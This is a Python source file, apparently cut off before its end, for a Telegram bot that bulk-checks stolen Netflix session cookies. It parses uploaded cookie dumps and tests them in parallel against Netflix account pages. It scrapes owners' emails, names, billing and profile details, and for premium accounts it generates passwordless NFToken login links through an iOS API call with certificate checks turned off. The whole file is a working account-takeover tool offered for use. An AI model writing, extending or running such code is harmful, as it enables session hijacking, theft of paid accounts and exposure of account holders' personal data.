# bulk_netflix_bot.py - PART 1
# Netflix Bulk Cookie Checker Bot
# Developer: @iam_esh | Channel: https://t.me/eshinfoo

import asyncio
import html
import json
import os
import re
import time
import zipfile
import io
from collections import defaultdict
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Tuple, Optional
import threading

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)
from telegram.constants import ParseMode

# ============================================================
#                    CONFIGURATION
# ============================================================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
CHANNEL_LINK = "https://t.me/eshinfoo"
DEVELOPER = "@iam_esh"
OWNER = "@iam_esh"
MAX_WORKERS = 50          # Concurrent checks (50 = fast but safe)
BATCH_SIZE = 100          # Cookies per batch report
REQUEST_TIMEOUT = 15      # Seconds to wait for Netflix response
MAX_RETRIES = 3           # Retry failed requests 3 times

# ============================================================
#              PREMIUM STYLING SYMBOLS
# ============================================================
# Using line emojis and symbols for premium look
# No regular emojis - pure aesthetic symbols

S = {
    # Basic symbols
    "star": "✦",
    "spark": "✧", 
    "dot": "•",
    "arrow": "➜",
    "double_arrow": "➤",
    
    # Lines and borders
    "line": "─",
    "double_line": "═",
    "branch": "├",
    "corner": "└",
    "vertical": "│",
    
    # Box elements
    "bullet": "◉",
    "square": "■",
    "diamond": "♦",
    
    # Status symbols
    "check": "✓",
    "cross": "✗",
    "warning": "⚠",
    "info": "ℹ",
    
    # Time and progress
    "clock": "⏣",
    "target": "⦿",
    "pointer": "⌲",
    
    # Premium symbols
    "crown": "♔",
    "shield": "⛊",
    "calendar": "📅",
    
    # Action symbols
    "link": "🔗",
    "copyright": "©",
    "rocket": "🚀",
    "fire": "🔥",
    "package": "📦",
    "speed": "⚡",
    "queue": "📋",
    "done": "✅"
}

# ============================================================
#                    FOLDER SETUP
# ============================================================

# Create necessary folders for operation
os.makedirs("temp_cookies", exist_ok=True)      # Temporary storage for uploaded files
os.makedirs("bot_output", exist_ok=True)         # Output for individual checks
os.makedirs("bulk_results", exist_ok=True)       # Bulk check results storage

# ============================================================
#                 USER DATA STORAGE
# ============================================================
# In-memory storage for user statistics and sessions
# In production, replace with Redis/PostgreSQL for scaling

user_data = defaultdict(lambda: {
    "total": 0,           # Total cookies checked
    "valid": 0,           # Valid accounts found
    "invalid": 0,         # Invalid/expired cookies
    "free": 0,            # Free/standard accounts
    "premium": 0,         # Premium accounts found
    "last_check": None,   # Timestamp of last check
    "redeem_count": 0,    # Number of codes redeemed
    "last_redeem": None,  # Last redeem timestamp
    "batch_jobs": [],     # History of batch jobs
    "current_batch": None # Current active batch
})

# Active batches tracking (user_id -> batch data)
active_batches = {}
batch_lock = threading.Lock()

# ============================================================
#                 NFTOKEN API CONFIG
# ============================================================
# NFToken allows passwordless login for premium accounts
# These are official Netflix iOS API endpoints

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false"}',
    "device_type": "NFAPPL-02-",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "accept-language": "en-US;q=1",
}

# ============================================================
#                COOKIE CONSTANTS
# ============================================================

# Netflix requires these cookies for authentication
REQUIRED_COOKIES = {"NetflixId"}
ALL_COOKIES = REQUIRED_COOKIES | {"SecureNetflixId", "nfvdid"}

# ============================================================
#                 HELPER FUNCTIONS
# ============================================================

def decode_value(value):
    """Decode Netflix's encoded values (HTML entities, Unicode, etc.)"""
    if not value:
        return None
    cleaned = html.unescape(str(value))
    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"')
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    return cleaned or None
    # ============================================================
#              COOKIE EXTRACTION FUNCTIONS
# ============================================================
# Supports multiple formats:
# 1. JSON array format (browser extensions)
# 2. Netscape format (standard cookie export)
# 3. Raw text format (NetflixId=value)

def extract_cookie_bundles(content: str) -> List[Dict]:
    """
    Extract multiple cookie bundles from file content
    Returns list of dictionaries with 'cookies' and 'raw' keys
    """
    bundles = []
    
    # --------------------------------------------------------
    # METHOD 1: Try JSON array format (multiple cookies)
    # --------------------------------------------------------
    try:
        data = json.loads(content)
        
        # Case: List of cookies (multiple accounts in one file)
        if isinstance(data, list):
            for item in data:
                if isinstance(item, dict):
                    cookies = {}
                    for cookie_name in ALL_COOKIES:
                        val = item.get(cookie_name) or item.get(cookie_name.lower())
                        if val:
                            cookies[cookie_name] = val
                    if cookies.get("NetflixId"):
                        bundles.append({
                            "cookies": cookies, 
                            "raw": json.dumps(item)
                        })
        
        # Case: Single cookie object
        elif isinstance(data, dict):
            cookies = {}
            for cookie_name in ALL_COOKIES:
                val = data.get(cookie_name) or data.get(cookie_name.lower())
                if val:
                    cookies[cookie_name] = val
            if cookies.get("NetflixId"):
                bundles.append({
                    "cookies": cookies, 
                    "raw": json.dumps(data)
                })
    except:
        pass  # Not JSON format, continue to next method
    
    # --------------------------------------------------------
    # METHOD 2: Try Netscape format (standard cookie export)
    # --------------------------------------------------------
    if not bundles:
        current_cookies = {}
        lines = content.splitlines()
        
        for line in lines:
            line = line.strip()
            
            # Skip empty lines and comments
            if not line or line.startswith("#"):
                continue
            
            # Netscape format: domain\tflag\tpath\tsecure\texpires\tname\tvalue
            parts = line.split("\t")
            
            if len(parts) >= 7:
                name = parts[5].lower()
                
                # Check if this is a Netflix cookie we care about
                if name in {c.lower() for c in ALL_COOKIES}:
                    current_cookies[name.capitalize()] = parts[6]
                    
                    # If we have NetflixId, save this bundle and start fresh
                    if name == "netflixid" and current_cookies.get("NetflixId"):
                        bundles.append({
                            "cookies": current_cookies.copy(), 
                            "raw": line
                        })
                        current_cookies = {}  # Reset for next cookie
    
    # --------------------------------------------------------
    # METHOD 3: Try raw text format (NetflixId=value)
    # --------------------------------------------------------
    if not bundles:
        for line in content.splitlines():
            cookies = {}
            
            for cookie_name in ALL_COOKIES:
                # Pattern: NetflixId=value or NetflixId="value"
                pattern = rf'{cookie_name}[\s]*=[\s]*"?([^";\s]+)"?'
                match = re.search(pattern, line, re.IGNORECASE)
                
                if match:
                    cookies[cookie_name] = match.group(1)
            
            if cookies.get("NetflixId"):
                bundles.append({
                    "cookies": cookies, 
                    "raw": line
                })
    
    return bundles


def cookies_to_netscape(cookies: Dict) -> str:
    """Convert cookie dict to Netscape format string"""
    lines = []
    
    for name, value in cookies.items():
        # Default values for Netscape format
        domain = ".netflix.com"
        tail_match = "TRUE"
        path = "/"
        secure = "TRUE" if name == "SecureNetflixId" else "FALSE"
        expires = "0"
        
        line = f"{domain}\t{tail_match}\t{path}\t{secure}\t{expires}\t{name}\t{value}"
        lines.append(line)
    
    return "\n".join(lines)


def validate_cookies(cookies: Dict) -> bool:
    """Check if cookies have required NetflixId"""
    if not cookies:
        return False
    
    netflix_id = cookies.get("NetflixId")
    if not netflix_id:
        return False
    
    # Basic validation - NetflixId should be non-empty string
    return bool(str(netflix_id).strip())


# ============================================================
#                 NFTOKEN GENERATION
# ============================================================

def create_nftoken(cookies: Dict) -> Optional[Dict]:
    """
    Generate NFToken for premium accounts
    NFToken allows passwordless login for 1 hour
    """
    netflix_id = decode_value(cookies.get("NetflixId"))
    if not netflix_id:
        return None
    
    headers = NFTOKEN_HEADERS.copy()
    headers["Cookie"] = f"NetflixId={netflix_id}"
    
    try:
        response = requests.get(
            NFTOKEN_API_URL, 
            params=NFTOKEN_QUERY_PARAMS,
            headers=headers, 
            timeout=15, 
            verify=False
        )
        
        if response.status_code == 200:
            data = response.json()
            
            # Navigate through nested response structure
            token_data = data.get("value", {})
            token_data = token_data.get("account", {})
            token_data = token_data.get("token", {})
            token_data = token_data.get("default", {})
            
            token = decode_value(token_data.get("token"))
            expires = token_data.get("expires")
            
            if token:
                return {
                    "token": token, 
                    "expires": expires
                }
    except Exception as e:
        # Silent fail - NFToken is bonus feature, not critical
        pass
    
    return None


def get_nftoken_expiry(expires) -> str:
    """Format NFToken expiry time for display"""
    if expires:
        try:
            timestamp = int(expires)
            # Handle 13-digit milliseconds timestamp
            if len(str(timestamp)) == 13:
                timestamp //= 1000
            return datetime.fromtimestamp(
                timestamp, 
                tz=timezone.utc
            ).strftime("%Y-%m-%d %H:%M:%S UTC")
        except:
            pass
    
    # Default: 1 hour from now
    return (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")


# ⬇️⬇️⬇️ PART 3 STARTS RIGHT BELOW THIS LINE ⬇️⬇️⬇️
# ============================================================
#              ACCOUNT INFO EXTRACTION
# ============================================================

def extract_account_info(response_text: str) -> Dict:
    """
    Extract account details from Netflix /account/membership page
    Returns dictionary with owner, email, country, plan, etc.
    """
    info = {}
    
    # Regex patterns for different data fields
    patterns = {
        "owner": [
            r'"name"\s*:\s*"([^"]+)"',
            r'"accountOwnerName"\s*:\s*"([^"]+)"'
        ],
        "email": [
            r'"emailAddress"\s*:\s*"([^"]+)"',
            r'"email"\s*:\s*"([^"]+)"'
        ],
        "country": [
            r'"currentCountry"\s*:\s*"([^"]+)"',
            r'"countryOfSignup":\s*"([^"]+)"'
        ],
        "member_since": [
            r'"memberSince":\s*"([^"]+)"'
        ],
        "next_billing": [
            r'"nextBillingDate"\s*:\s*"([^"]+)"'
        ],
        "plan": [
            r'"localizedPlanName"\s*:\s*"([^"]+)"',
            r'"planName"\s*:\s*"([^"]+)"'
        ],
        "streams": [
            r'"maxStreams"\s*:\s*"?([^",}]+)"?'
        ],
        "quality": [
            r'"videoQuality"\s*:\s*"([^"]+)"'
        ],
        "status": [
            r'"membershipStatus"\s*:\s*"([^"]+)"'
        ],
    }
    
    # Extract each field using patterns
    for key, pats in patterns.items():
        for pat in pats:
            match = re.search(pat, response_text, re.IGNORECASE)
            if match:
                info[key] = decode_value(match.group(1))
                break
    
    # Extract profile names (multiple profiles on account)
    profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', response_text)
    if profiles:
        info["profiles"] = ", ".join(set(profiles[:3]))  # Max 3 profiles
    
    # Check if account is on hold (payment issues)
    if re.search(r'"isUserOnHold"\s*:\s*true', response_text, re.IGNORECASE):
        info["on_hold"] = "Yes"
    else:
        info["on_hold"] = "No"
    
    # Check if email is verified
    if re.search(r'"emailVerified"\s*:\s*true', response_text, re.IGNORECASE):
        info["email_verified"] = "Yes"
    else:
        info["email_verified"] = "No"
    
    return info


def check_single_cookie(cookies: Dict) -> Dict:
    """
    Check a single cookie against Netflix API
    Returns result with validity, premium status, account info, and NFToken
    """
    # Create session and add cookies
    session = requests.Session()
    session.cookies.update(cookies)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    }
    
    result = {
        "valid": False,
        "premium": False,
        "info": None,
        "nftoken": None,
        "error": None
    }
    
    try:
        # Request account membership page
        response = session.get(
            "https://www.netflix.com/account/membership",
            headers=headers,
            timeout=REQUEST_TIMEOUT
        )
        
        if response.status_code == 200:
            info = extract_account_info(response.text)
            
            # Check if we got country (indicates successful login)
            if info.get("country"):
                result["valid"] = True
                result["info"] = info
                
                # Check if premium plan (for NFToken generation)
                plan = info.get("plan", "").lower()
                if "premium" in plan:
                    result["premium"] = True
                    result["nftoken"] = create_nftoken(cookies)
                    
    except requests.exceptions.Timeout:
        result["error"] = "Timeout"
    except requests.exceptions.ConnectionError:
        result["error"] = "Connection Error"
    except Exception as e:
        result["error"] = str(e)[:100]
    
    finally:
        session.close()
    
    return result


def check_cookies_batch(cookies_list: List[Dict], progress_callback=None) -> List[Dict]:
    """
    Check multiple cookies in parallel using ThreadPoolExecutor
    Returns results sorted by original order
    """
    results = []
    completed = 0
    total = len(cookies_list)
    
    # Use ThreadPoolExecutor for parallel execution
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # Submit all tasks
        future_to_cookie = {
            executor.submit(check_single_cookie, c): i 
            for i, c in enumerate(cookies_list)
        }
        
        # Collect results as they complete
        for future in as_completed(future_to_cookie):
            idx = future_to_cookie[future]
            
            try:
                result = future.result(timeout=30)
                results.append({
                    "index": idx,
                    "cookies": cookies_list[idx],
                    "result": result
                })
            except Exception as e:
                results.append({
                    "index": idx,
                    "cookies": cookies_list[idx],
                    "result": {"valid": False, "error": str(e)}
                })
            
            completed += 1
            if progress_callback:
                progress_callback(completed, total)
    
    # Sort by original index to maintain order
    results.sort(key=lambda x: x["index"])
    return results


# ⬇️⬇️⬇️ PART 4 STARTS RIGHT BELOW THIS LINE ⬇️⬇️⬇️
# ============================================================
#              TELEGRAM BOT HANDLERS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/start command - Premium welcome screen with buttons"""
    user = update.effective_user
    
    message = f"""
{S['double_line'] * 48}

{S['star']}{S['star']}{S['star']} *BULK NETFLIX CHECKER* {S['star']}{S['star']}{S['star']}

{S['shield']} *Welcome {user.first_name}!* {S['shield']}

{S['rocket']} *Premium Features:* {S['rocket']}

{S['bullet']} {S['package']} *Bulk Checking* - 1000+ cookies at once
{S['bullet']} {S['speed']} *50x Concurrent* - Lightning fast checks
{S['bullet']} {S['fire']} *Premium Detection* - Auto NFToken links
{S['bullet']} {S['link']} *One-Click Login* - No password needed
{S['bullet']} {S['done']} *Auto Export* - ZIP with all results

{S['branch']}── {S['target']} *Quick Commands* ──{S['branch']}

{S['pointer']} `/start` - Launch bot
{S['pointer']} `/help` - Show all commands
{S['pointer']} `/stats` - Your statistics
{S['pointer']} `/batch` - Check batch status
{S['pointer']} `/export` - Download results

{S['branch']}── {S['target']} *How to Use* ──{S['branch']}

{S['bullet']} 1. Export cookies (Netscape/JSON format)
{S['bullet']} 2. Send .txt, .json, or .zip file
{S['bullet']} 3. Click START BATCH button
{S['bullet']} 4. Watch live progress bar
{S['bullet']} 5. Download results with /export

{S['double_line'] * 48}

{S['copyright']} *{DEVELOPER}* | {S['link']} *{CHANNEL_LINK}*

{S['spark']} *Powered by Advanced Bulk Checker* {S['spark']}
"""
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(f"{S['package']} BATCH STATUS {S['package']}", callback_data="batch"),
         InlineKeyboardButton(f"{S['star']} MY STATS {S['star']}", callback_data="stats")],
        [InlineKeyboardButton(f"{S['link']} JOIN CHANNEL {S['link']}", url=CHANNEL_LINK),
         InlineKeyboardButton(f"{S['crown']} DEVELOPER {S['crown']}", url=f"https://t.me/{DEVELOPER[1:]}")]
    ])
    
    await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=keyboard)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/help command - Detailed command list and usage"""
    message = f"""
{S['double_line'] * 48}

{S['star']} *COMMAND LIST* {S['star']}
{S['double_line'] * 48}

{S['branch']}── {S['target']} *Basic Commands*

{S['pointer']} `/start` - Launch the bot
{S['pointer']} `/help` - Show this menu
{S['pointer']} `/stats` - View your statistics
{S['pointer']} `/batch` - Check batch status
{S['pointer']} `/export` - Download results

{S['branch']}── {S['target']} *File Formats Supported*

{S['bullet']} `.txt` - Netscape cookie format
{S['bullet']} `.json` - Browser extension export
{S['bullet']} `.zip` - Multiple cookie files (1000+)

{S['branch']}── {S['target']} *Premium Features*

{S['check']} NFToken login links (no password)
{S['check']} Real-time progress tracking
{S['check']} Country flags & plan details
{S['check']} Auto ZIP export with results
{S['check']} Premium account detection

{S['branch']}── {S['target']} *Rate Limits*

{S['dot']} 5 batches per user per hour
{S['dot']} 10,000 cookies per batch max
{S['dot']} 50 concurrent checks per batch

{S['double_line'] * 48}

{S['copyright']} {DEVELOPER} | {S['link']} {CHANNEL_LINK}
"""
    await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/stats command - Show user's personal statistics"""
    user_id = update.effective_user.id
    data = user_data[user_id]
    
    # Calculate success rate
    success_rate = (data['valid'] / data['total'] * 100) if data['total'] > 0 else 0
    
    message = f"""
{S['double_line'] * 48}

{S['star']} *YOUR STATISTICS* {S['star']}
{S['double_line'] * 48}

{S['vertical']} *User:* {update.effective_user.first_name}
{S['vertical']} *ID:* `{user_id}`

{S['branch']}── {S['target']} *Bulk Check History*

{S['package']} Total Cookies: `{data['total']:,}`
{S['check']} Valid Accounts: `{data['valid']:,}`
{S['star']} Premium Accounts: `{data['premium']:,}`
{S['spark']} Free Accounts: `{data['free']:,}`
{S['cross']} Invalid Cookies: `{data['invalid']:,}`

{S['branch']}── {S['target']} *Performance*

{S['speed']} Success Rate: `{success_rate:.1f}%`
{S['clock']} Last Check: `{data['last_check'] or 'Never'}`

{S['branch']}── {S['target']} *Rewards*

{S['fire']} Codes Redeemed: `{data.get('redeem_count', 0)}`

{S['double_line'] * 48}

{S['copyright']} {DEVELOPER} | {S['link']} {CHANNEL_LINK}
"""
    await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)


# ⬇️⬇️⬇️ PART 5 STARTS RIGHT BELOW THIS LINE ⬇️⬇️⬇️
async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded cookie files (supports .txt, .json, .zip)"""
    user_id = update.effective_user.id
    document = update.message.document
    file_name = document.file_name
    
    # Check if user already has an active batch running
    if user_id in active_batches:
        await update.message.reply_text(
            f"{S['warning']} *Batch Already Running*\n\n"
            f"{S['clock']} Please wait for current batch to complete!\n\n"
            f"{S['pointer']} Use `/batch` to check status",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Validate file extension
    is_zip = file_name.lower().endswith('.zip')
    if not (file_name.lower().endswith(('.txt', '.json', '.zip'))):
        await update.message.reply_text(
            f"{S['cross']} *Unsupported Format*\n\n"
            f"{S['pointer']} Send `.txt`, `.json`, or `.zip` files only!\n"
            f"{S['info']} ZIP can contain multiple cookie files for bulk checking",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Send initial status message
    status_msg = await update.message.reply_text(
        f"{S['rocket']} *DOWNLOADING* `{file_name}`...\n\n"
        f"{S['square'] * 20}\n0%",
        parse_mode=ParseMode.MARKDOWN
    )
    
    try:
        # Download file from Telegram
        file = await context.bot.get_file(document.file_id)
        temp_path = f"temp_cookies/{user_id}_{file_name}"
        await file.download_to_drive(temp_path)
        
        # Update status - extracting cookies
        await status_msg.edit_text(
            f"{S['package']} *EXTRACTING COOKIES*...\n\n"
            f"{S['square'] * 5}{'░' * 15}\n25%\n\n"
            f"{S['info']} Parsing file for Netflix cookies...",
            parse_mode=ParseMode.MARKDOWN
        )
        
        all_bundles = []
        
        if is_zip:
            # Extract all files from ZIP archive
            with zipfile.ZipFile(temp_path, 'r') as zf:
                for zip_name in zf.namelist():
                    if zip_name.endswith(('.txt', '.json')):
                        with zf.open(zip_name) as f:
                            content = f.read().decode('utf-8', errors='ignore')
                            bundles = extract_cookie_bundles(content)
                            for bundle in bundles:
                                bundle['source_file'] = zip_name
                            all_bundles.extend(bundles)
        else:
            # Single file - read directly
            with open(temp_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            all_bundles = extract_cookie_bundles(content)
        
        # Clean up temp file
        os.remove(temp_path)
        
        # Check if any valid cookies were found
        if not all_bundles:
            await status_msg.delete()
            await update.message.reply_text(
                f"{S['cross']} *No Valid Cookies Found*\n\n"
                f"{S['warning']} No NetflixId cookies detected in the file!\n\n"
                f"{S['pointer']} Make sure your cookies contain `NetflixId`\n\n"
                f"{S['copyright']} {DEVELOPER}",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        total_cookies = len(all_bundles)
        
        # Ask user confirmation before starting batch
        confirm_keyboard = InlineKeyboardMarkup([[
            InlineKeyboardButton(f"{S['check']} START BATCH {S['check']}", callback_data=f"confirm_{user_id}"),
            InlineKeyboardButton(f"{S['cross']} CANCEL {S['cross']}", callback_data=f"cancel_{user_id}")
        ]])
        
        # Calculate estimated time
        est_minutes = total_cookies // MAX_WORKERS + 1
        
        await status_msg.delete()
        await update.message.reply_text(
            f"{S['package']} *Batch Ready for Processing*\n\n"
            f"{S['double_line'] * 35}\n\n"
            f"{S['pointer']} Cookies Found: `{total_cookies:,}`\n"
            f"{S['speed']} Concurrent Checks: `{MAX_WORKERS}`\n"
            f"{S['clock']} Estimated Time: `{est_minutes}` minutes\n\n"
            f"{S['warning']} *Note:* Click START to begin checking!\n"
            f"{S['info']} Results will be auto-saved for 24 hours\n\n"
            f"{S['double_line'] * 35}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=confirm_keyboard
        )
        
        # Store batch data in context for when user confirms
        context.user_data['pending_batch'] = {
            'bundles': all_bundles,
            'total': total_cookies,
            'file_name': file_name
        }
        
    except Exception as e:
        await status_msg.edit_text(
            f"{S['cross']} *Error Processing File*\n\n"
            f"{S['warning']} `{str(e)[:100]}`\n\n"
            f"{S['copyright']} {DEVELOPER}",
            parse_mode=ParseMode.MARKDOWN
        )


# ⬇️⬇️⬇️ PART 6 STARTS RIGHT BELOW THIS LINE ⬇️⬇️⬇️
async def process_batch(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, bundles: List[Dict]):
    """Process bulk cookie batch with live progress updates"""
    
    # Prevent duplicate batch processing
    if user_id in active_batches:
        return
    
    # Initialize batch tracking
    active_batches[user_id] = {
        'total': len(bundles),
        'completed': 0,
        'valid': 0,
        'premium': 0,
        'free': 0,
        'invalid': 0,
        'results': [],
        'start_time': time.time()
    }
    
    # Send initial progress message
    progress_msg = await update.effective_message.reply_text(
        f"{S['fire']} *BATCH PROCESSING* {S['fire']}\n\n"
        f"{S['package']} Total: `{len(bundles):,}`\n"
        f"{S['speed']} Speed: `{MAX_WORKERS}` concurrent\n"
        f"{S['square'] * 20}\n0%\n\n"
        f"{S['clock']} Elapsed: 0s\n"
        f"{S['target']} Status: Starting...",
        parse_mode=ParseMode.MARKDOWN
    )
    
    # Process in chunks for smoother UI updates
    results = []
    chunk_size = BATCH_SIZE
    
    for chunk_start in range(0, len(bundles), chunk_size):
        chunk_end = min(chunk_start + chunk_size, len(bundles))
        chunk = bundles[chunk_start:chunk_end]
        
        # Calculate progress percentage
        percent = (chunk_start / len(bundles)) * 100
        filled = int(20 * chunk_start / len(bundles))
        bar = f"{S['square'] * filled}{'░' * (20 - filled)}"
        
        # Update progress message
        await progress_msg.edit_text(
            f"{S['fire']} *BATCH PROCESSING* {S['fire']}\n\n"
            f"{S['package']} Progress: `{chunk_start:,}/{len(bundles):,}`\n"
            f"{S['check']} Valid: `{active_batches[user_id]['valid']:,}`\n"
            f"{S['star']} Premium: `{active_batches[user_id]['premium']:,}`\n"
            f"{S['spark']} Free: `{active_batches[user_id]['free']:,}`\n"
            f"{S['cross']} Invalid: `{active_batches[user_id]['invalid']:,}`\n"
            f"{bar}\n`{percent:.1f}%`\n\n"
            f"{S['clock']} Elapsed: `{int(time.time() - active_batches[user_id]['start_time'])}`s\n"
            f"{S['speed']} Chunk: `{chunk_start+1}-{chunk_end}`",
            parse_mode=ParseMode.MARKDOWN
        )
        
        # Process current chunk in thread pool
        chunk_results = await asyncio.get_event_loop().run_in_executor(
            None, check_cookies_batch, chunk, None
        )
        
        # Update results and counters
        for res in chunk_results:
            result = res['result']
            if result['valid']:
                active_batches[user_id]['valid'] += 1
                if result['premium']:
                    active_batches[user_id]['premium'] += 1
                else:
                    active_batches[user_id]['free'] += 1
            else:
                active_batches[user_id]['invalid'] += 1
            
            results.append(res)
        
        active_batches[user_id]['completed'] = chunk_end
        active_batches[user_id]['results'] = results
    
    # Batch complete - calculate final stats
    elapsed = int(time.time() - active_batches[user_id]['start_time'])
    valid_count = active_batches[user_id]['valid']
    premium_count = active_batches[user_id]['premium']
    free_count = active_batches[user_id]['free']
    invalid_count = active_batches[user_id]['invalid']
    success_rate = (valid_count / len(bundles) * 100) if len(bundles) > 0 else 0
    
    # Generate result files
    result_files = await generate_result_files(user_id, results, active_batches[user_id])
    
    # Update final completion message
    await progress_msg.edit_text(
        f"{S['done']} *BATCH COMPLETE* {S['done']}\n\n"
        f"{S['double_line'] * 35}\n\n"
        f"{S['package']} Total Cookies: `{len(bundles):,}`\n"
        f"{S['check']} Valid Accounts: `{valid_count:,}`\n"
        f"{S['star']} Premium Accounts: `{premium_count:,}`\n"
        f"{S['spark']} Free Accounts: `{free_count:,}`\n"
        f"{S['cross']} Invalid Cookies: `{invalid_count:,}`\n\n"
        f"{S['speed']} Success Rate: `{success_rate:.1f}%`\n"
        f"{S['clock']} Total Time: `{elapsed // 60}m {elapsed % 60}s`\n\n"
        f"{S['link']} *Results saved!* Use `/export` to download\n\n"
        f"{S['double_line'] * 35}",
        parse_mode=ParseMode.MARKDOWN
    )
    
    # Send premium accounts summary (first 10)
    premium_accounts = [r for r in results if r['result'].get('premium')]
    if premium_accounts:
        summary = f"{S['star']} *PREMIUM ACCOUNTS FOUND* {S['star']}\n\n"
        for i, acc in enumerate(premium_accounts[:10]):
            info = acc['result']['info']
            email = info.get('email', 'N/A')
            country = info.get('country', 'N/A')
            summary += f"{S['pointer']} `{email}` | {country}\n"
        
        if len(premium_accounts) > 10:
            summary += f"\n{S['dot']} +{len(premium_accounts) - 10} more premium accounts"
        
        keyboard = InlineKeyboardMarkup([[
            InlineKeyboardButton(f"{S['link']} EXPORT RESULTS {S['link']}", callback_data="export")
        ]])
        
        await update.effective_message.reply_text(
            summary, 
            parse_mode=ParseMode.MARKDOWN, 
            reply_markup=keyboard
        )
    
    # Update user statistics
    user_data[user_id]['total'] += len(bundles)
    user_data[user_id]['valid'] += valid_count
    user_data[user_id]['premium'] += premium_count
    user_data[user_id]['free'] += free_count
    user_data[user_id]['invalid'] += invalid_count
    user_data[user_id]['last_check'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Clean up active batch
    del active_batches[user_id]


# ⬇️⬇️⬇️ PART 7 STARTS RIGHT BELOW THIS LINE ⬇️⬇️⬇️
async def generate_result_files(user_id: int, results: List[Dict], batch_data: Dict) -> Dict:
    """Generate result files for download (premium, free, invalid, summary)"""
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    base_path = f"bulk_results/{user_id}_{timestamp}"
    os.makedirs(base_path, exist_ok=True)
    
    # ============================================================
    # 1. PREMIUM ACCOUNTS FILE (with NFToken login links)
    # ============================================================
    premium_results = []
    for res in results:
        if res['result'].get('premium'):
            info = res['result']['info']
            nftoken = res['result'].get('nftoken')
            
            line = f"{S['double_line'] * 40}\n"
            line += f"✨ PREMIUM ACCOUNT ✨\n"
            line += f"{S['double_line'] * 40}\n\n"
            line += f"📧 Email: {info.get('email', 'N/A')}\n"
            line += f"👤 Owner: {info.get('owner', 'N/A')}\n"
            line += f"🌍 Country: {info.get('country', 'N/A')}\n"
            line += f"📦 Plan: {info.get('plan', 'PREMIUM')}\n"
            line += f"📺 Quality: {info.get('quality', 'N/A')}\n"
            line += f"📱 Streams: {info.get('streams', 'N/A')}\n"
            line += f"⏸️ On Hold: {info.get('on_hold', 'No')}\n"
            line += f"✅ Email Verified: {info.get('email_verified', 'No')}\n"
            line += f"📅 Member Since: {info.get('member_since', 'N/A')}\n"
            line += f"🗓️ Next Billing: {info.get('next_billing', 'N/A')}\n"
            line += f"🎭 Profiles: {info.get('profiles', 'N/A')}\n\n"
            
            if nftoken:
                line += f"{S['link']} *NFToken Login Links (No Password Needed)*\n"
                line += f"{S['double_line'] * 40}\n"
                line += f"🖥️ PC Login: https://www.netflix.com/login?nftoken={nftoken['token']}\n"
                line += f"📱 Mobile Login: https://www.netflix.com/unsupported?nftoken={nftoken['token']}\n"
                line += f"⏣ Expires: {get_nftoken_expiry(nftoken.get('expires'))}\n\n"
            
            line += f"🍪 Cookies:\n{json.dumps(res['cookies'], indent=2)}\n"
            line += f"\n{S['line'] * 50}\n\n"
            premium_results.append(line)
    
    # ============================================================
    # 2. FREE/STANDARD ACCOUNTS FILE
    # ============================================================
    free_results = []
    for res in results:
        if res['result'].get('valid') and not res['result'].get('premium'):
            info = res['result']['info']
            
            line = f"{S['line'] * 40}\n"
            line += f"📧 Email: {info.get('email', 'N/A')}\n"
            line += f"👤 Owner: {info.get('owner', 'N/A')}\n"
            line += f"🌍 Country: {info.get('country', 'N/A')}\n"
            line += f"📦 Plan: {info.get('plan', 'FREE/STANDARD')}\n"
            line += f"📺 Quality: {info.get('quality', 'N/A')}\n"
            line += f"📱 Streams: {info.get('streams', 'N/A')}\n"
            line += f"🎭 Profiles: {info.get('profiles', 'N/A')}\n\n"
            line += f"🍪 Cookies:\n{json.dumps(res['cookies'], indent=2)}\n"
            line += f"\n{S['line'] * 40}\n\n"
            free_results.append(line)
    
    # ============================================================
    # 3. INVALID/EXPIRED COOKIES FILE
    # ============================================================
    invalid_results = []
    for res in results:
        if not res['result'].get('valid'):
            line = f"{S['cross']} Invalid Cookie\n"
            line += f"🍪 Cookies: {json.dumps(res['cookies'])}\n"
            line += f"⚠️ Error: {res['result'].get('error', 'Invalid/Expired')}\n"
            line += f"{S['line'] * 40}\n\n"
            invalid_results.append(line)
    
    # ============================================================
    # 4. SUMMARY REPORT FILE
    # ============================================================
    success_rate = (batch_data['valid'] / batch_data['total'] * 100) if batch_data['total'] > 0 else 0
    
    summary_content = f"""
